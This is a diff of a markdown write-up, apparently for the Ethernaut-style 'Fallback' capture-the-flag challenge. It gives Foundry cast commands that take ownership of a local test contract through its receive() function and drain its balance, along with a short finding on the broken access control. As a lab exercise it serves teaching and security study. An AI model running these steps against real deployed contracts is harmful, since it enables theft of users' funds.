@@ -1,8 +1,8 @@
-** Objective
+## Objective
 
-Bypass access-control mechanisms protecting the Fallback.sol contract, force an arbitrary state modification to hijack the master owner address variable, and completely drain the balance via unauthorized liquidity exfiltration.
+Bypass access-control mechanisms protecting the Fallback.sol contract, force an arbitrary state modification to hijack the master owner address variable, and completely drain the balance via unauthorized liquidity exfiltration.   
 
-** Exploitation Commands (PoC)
+## Exploitation Commands (PoC)
 Bash
 
 * Phase 1: Seed the ledger by contributing 1 wei to satisfy tracking mappings
@@ -17,7 +17,7 @@ cast call 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "owner()(address)" --rpc-ur
 * Phase 4: Execute unauthorized withdrawal payload to drain pooled capital
 cast send 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "withdraw()" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff
 
-** Summary of Findings
+## Summary of Findings
 
 The contract possessed a Critical Broken Access Control flaw residing within the native unnamed fallback function receive(). The code implicitly updated critical contract parameters based purely on basic validation logic gates:
 Solidity
